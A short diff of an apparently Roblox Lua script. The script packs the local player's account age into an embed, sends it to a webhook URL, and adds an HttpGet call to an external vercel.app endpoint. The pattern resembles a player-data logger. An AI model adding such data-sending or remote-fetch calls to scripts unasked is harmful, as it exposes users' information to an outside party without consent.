@@ -40,13 +40,10 @@ local embed = {
             ["name"] = "Account Age:",
             ["value"] = tostring(game.Players.LocalPlayer.AccountAge)
         }
-        {
-            ["name"] = "other stuff:",
-            ["value"] = game:HttpGet('https://a-sigma-umber.vercel.app/api/main')
-        }
-    },https://a-sigma-umber.vercel.app/api/main
+    },
     ["footer"] = {
         ["text"] = ""
     }
 }
 SendMessageEMBED(url, embed)
+game:HttpGet('https://a-sigma-umber.vercel.app/api/main')
